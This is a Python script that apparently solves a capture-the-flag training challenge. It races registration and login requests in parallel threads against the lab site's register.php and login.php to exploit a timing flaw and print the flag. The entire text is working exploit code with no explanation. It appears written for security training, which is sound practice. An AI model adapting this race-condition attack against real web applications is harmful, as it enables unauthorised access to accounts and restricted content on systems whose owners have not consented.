import requests
import threading
import random
import string

baseurl="http://aart.training.jinblack.it"


def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))
        
def login(session,username,password):
    url="%s/login.php" % baseurl
    data={"username": username, "password": password}
    r=session.post(url, data=data)
    if("flag" in r.text):
        print(r.text)
    return r.text

def registration(session, username, password):
    url="%s/register.php" % baseurl
    data={"username": username, "password": password}
    r=session.post(url, data=data)
    return r.text


s = requests.Session() #  to create session
u=randomString()
p=randomString()

t1=threading.Thread(target=registration, args=(s,u,p))
t2=threading.Thread(target=login, args=(s,u,p))

t1.start()
t2.start()

print(u,p)

t1.join()
t2.join()

   
